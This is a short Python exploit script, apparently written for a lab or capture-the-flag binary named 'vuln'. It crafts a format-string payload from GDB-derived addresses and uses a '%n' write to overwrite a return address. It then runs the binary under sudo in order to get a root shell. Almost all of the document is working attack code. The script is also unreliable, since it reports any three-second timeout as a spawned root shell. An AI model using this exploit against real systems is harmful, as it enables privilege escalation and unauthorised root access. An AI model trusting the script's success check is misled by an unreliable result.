#!/usr/bin/env python3
import struct
import subprocess

# From GDB analysis:
return_addr_location = 0xffffd37c
target_addr = 0x80491f6

print(f"Return address location: {hex(return_addr_location)}")
print(f"Target function: {hex(target_addr)}")

# Calculate bytes needed
bytes_printed = 4  # The 4 bytes of the address we're writing
bytes_needed = target_addr - bytes_printed

print(f"Bytes needed: {bytes_needed}")

# Create payload
payload = struct.pack("<I", return_addr_location)
payload += f"%{bytes_needed}c%7$n".encode()

print("Executing exploit...")
try:
    result = subprocess.run(
        ['sudo', './vuln', payload],
        timeout=3,
        capture_output=False
    )
    print("No shell spawned")
except subprocess.TimeoutExpired:
    print("*** SHELL SPAWNED! SUCCESS! ***")
    print("*** You now have a root shell! ***")
except Exception as e:
    print(f"Error: {e}")

